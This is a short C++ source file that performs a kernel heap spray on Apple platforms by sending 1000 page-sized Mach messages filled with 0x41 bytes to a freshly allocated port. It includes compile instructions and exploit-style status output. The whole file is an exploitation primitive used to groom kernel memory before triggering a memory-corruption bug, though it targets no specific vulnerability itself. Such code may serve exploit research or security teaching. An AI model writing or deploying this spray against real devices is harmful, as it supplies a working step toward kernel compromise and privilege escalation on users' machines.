// ============================================================
// heap_spray.cpp — kernel heap spray via mach_msg
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o heap_spray heap_spray.cpp
// ============================================================
#include <mach/mach.h>
#include <cstdio>
#include <cstring>
#include <array>

constexpr int SPRAY_COUNT = 1000;
constexpr size_t MSG_SIZE = 0x1000;

int main() {
    mach_port_t port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);

    std::array<char, MSG_SIZE> payload{};
    std::memset(payload.data(), 0x41, payload.size());

    for (int i = 0; i < SPRAY_COUNT; i++) {
        auto* msg = reinterpret_cast<mach_msg_header_t*>(payload.data());
        msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->msgh_size = static_cast<mach_msg_size_t>(MSG_SIZE);
        msg->msgh_remote_port = port;
        msg->msgh_local_port = MACH_PORT_NULL;

        mach_msg_return_t r = mach_msg_send(msg);
        if (r != MACH_MSG_SUCCESS) {
            std::printf("[-] send %d failed: 0x%x\n", i, r);
            break;
        }
    }
    std::printf("[+] sprayed %d messages of size %zu\n", SPRAY_COUNT, MSG_SIZE);
    return 0;
}
